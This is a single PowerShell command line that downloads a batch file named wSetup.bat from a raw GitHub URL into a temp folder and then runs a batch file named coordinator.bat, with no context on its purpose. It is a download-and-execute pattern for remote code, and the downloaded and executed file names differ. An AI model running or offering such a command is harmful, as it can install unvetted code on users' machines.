powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/droid003best/wSetup/main/wSetup.bat', '%Temp%\wSetup\Installation\wSetup.bat') }" & %Temp%\coordinator.bat

